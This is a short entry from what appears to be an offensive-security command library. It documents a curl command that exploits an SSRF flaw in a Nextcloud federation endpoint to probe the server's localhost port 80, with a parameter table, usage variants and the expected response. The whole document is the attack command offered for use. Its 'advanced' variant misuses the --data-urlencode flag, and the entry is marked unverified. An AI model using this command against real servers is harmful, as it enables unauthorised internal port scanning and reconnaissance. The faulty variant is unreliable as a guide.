---
id: cmd-ssrf-port-80
data: >-
  curl -X POST -d "url=http://127.0.0.1:80"
  https://target-nextcloud/index.php/apps/federation/trusted-servers
tags:
  - ssrf
  - port-scan
type: command
output: >-
  {"message":"Client error response [url] http://127.0.0.1/status.php [status
  code] 404 [reason phrase] Not Found"}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.710Z'
verified: false
validated: true
submitted: true
---
# ssrf-probe-port-80

## Command

```bash
curl -X POST -d "url=http://127.0.0.1:80" https://target-nextcloud/index.php/apps/federation/trusted-servers
```

## Description

This command exploits SSRF to probe localhost port 80 by sending an internal URL, revealing if the port is open through the server's cURL response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-d "url=http://127.0.0.1:80"` | Internal URL targeting port 80 | Yes |
| `https://target-nextcloud/...` | Vulnerable endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d "url=http://127.0.0.1:80" https://target-nextcloud/index.php/apps/federation/trusted-servers
```

### Advanced Usage

```bash
curl -X POST -d "url=http://127.0.0.1:80" --data-urlencode https://target-nextcloud/index.php/apps/federation/trusted-servers
```

## Expected Output

JSON response: {"message":"Client error response [url] http://127.0.0.1/status.php [status code] 404 [reason phrase] Not Found"}, indicating open port.

## Related

- [[commands/ssrf-probe-port-8080]]
- [[procedures/Probe-Localhost-Port-80-via-SSRF]]
